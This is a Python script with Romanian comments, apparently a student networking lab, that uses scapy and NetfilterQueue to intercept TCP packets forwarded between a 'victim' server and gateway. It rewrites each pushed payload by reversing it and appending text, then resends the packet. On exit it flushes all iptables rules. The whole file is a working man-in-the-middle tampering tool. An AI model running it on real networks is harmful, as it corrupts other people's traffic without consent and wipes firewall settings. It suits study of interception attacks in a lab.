from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# adresele ip ale victimelor: serverul si gateway-ul
server_ip = '198.7.0.2'
gateway_ip = '198.7.0.1'

# metoda care altereaza structura pachetelor din conexiunea TCP
def detect_and_then_alter_packet(packet):

    print(f"Am prins un pachet...")

    # extrag payload-ul pachetului de tipul NetfilterQueue interceptat
    old_octets = packet.get_payload()
    # si il transform intr-un pachet scapy pentru a ii modifica load-ul
    scapy_packet = IP(old_octets)

    # verific daca pachetul respectiv este de tip TCP, si daca provine de la server sau gateway
    if TCP in scapy_packet and scapy_packet[IP].src in [server_ip, gateway_ip]:

        # verific daca pachetul are flag-ul PSH in payload-ul sau

        # PSH indica faptul ca fragmentul primit este ultimul din seria sa, in cazul in care
        # payload-ul pachetelor depaseste MTU-ul stabilit la handshake si necesita fragmentare

        # si, de asemena, ca acesta va fi procesat chiar atunci cand ajunge la destinatie
        # pachetele cu flagul MF (multiple fragments) sunt buffered pana la receptia tuturor fragmentelor
        if "P" in scapy_packet[TCP].flags:
            print("[Before]:", scapy_packet.summary())

            # noul scapy_packet este modificat cu functia alter_packet
            scapy_packet = alter_packet(scapy_packet)
            # si afisat pentru a vedea modificarile (checksum, IHL - header length)
            print("[After ]:", scapy_packet.show2())
    # si trimis
    send(scapy_packet)

# metoda care altereaza payload-ul pachetului
def alter_packet(packet):

    print(f"Stric pachetul...")

    # extrag mesajul din load-ul pachetului, se afla in layer-ul ###[Raw]###
    payload = packet[Raw].load
    # si il transform in string pentru a il modifica cu usurinta
    payload_str = str(payload, 'utf-8')
    print("Mesajul vechi era:", payload_str)

    # printr-o originalitate fantastica am decis sa intorc mesajul in oglinda
    new_payload = payload_str[::-1] + ' alabalaportocala'
    packet[Raw].load = new_payload
    print("Mesaj imbunatatit", str(packet[Raw].load))
    
    # deoarece am alterat lungimea load-ului trebuie sa modific seq number, 
    # adica pozitia fragmentului in stream-ul de TCP
    #  ???? altcumva nu merge
    packet[TCP].seq = packet[TCP].seq + len(payload) - len(new_payload)

    # am modificat pachetul si stergem campurile len si checksum
    # in mod normal ar trebui recalculate, dar scapy face asta automat
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum

    # returnam pachetul modificat
    return packet

def main():
    # folosesc o coada pentru a intecepta si altera pachetele
    queue = NetfilterQueue()

    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 11")
        queue.bind(11, detect_and_then_alter_packet)
        queue.run()

    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()

if __name__ == "__main__":
    main()